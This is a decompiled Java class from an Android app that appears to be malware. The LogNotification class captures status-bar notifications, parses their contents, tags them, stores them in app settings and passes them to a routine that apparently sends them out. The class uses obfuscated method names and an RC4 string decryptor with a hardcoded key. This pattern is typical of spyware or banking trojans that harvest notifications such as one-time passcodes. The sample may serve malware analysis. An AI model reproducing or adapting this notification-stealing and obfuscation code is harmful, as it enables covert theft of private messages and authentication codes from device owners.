/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.service.notification.StatusBarNotification
 *  android.util.Base64
 */
package com.example.mmm.Utils;

import android.content.Context;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.NotificationParser;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

public final class LogNotification {
    constants strings$ = new constants();
    utils propose$ = new utils();
    private Context princess$;

    LogNotification(Context context) {
        this.princess$ = context;
    }

    private String _spirits(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    final void _revenue(StatusBarNotification statusBarNotification) {
        this.sendNotificationLog(new NotificationParser(statusBarNotification, false).toString());
    }

    final void sendNotificationLog(String string) {
        utils utils3 = new utils();
        constants constants2 = new constants();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("{Notification} ");
        stringBuilder.append(string);
        stringBuilder.append("[143523#]");
        string = stringBuilder.toString();
        utils3.Log("sendSMS", string);
        utils3.SettingsToAdd(this.princess$, "AS", string);
        utils3._compiled(this.princess$, utils3.SettingsRead(this.princess$, "QQ"));
    }
}

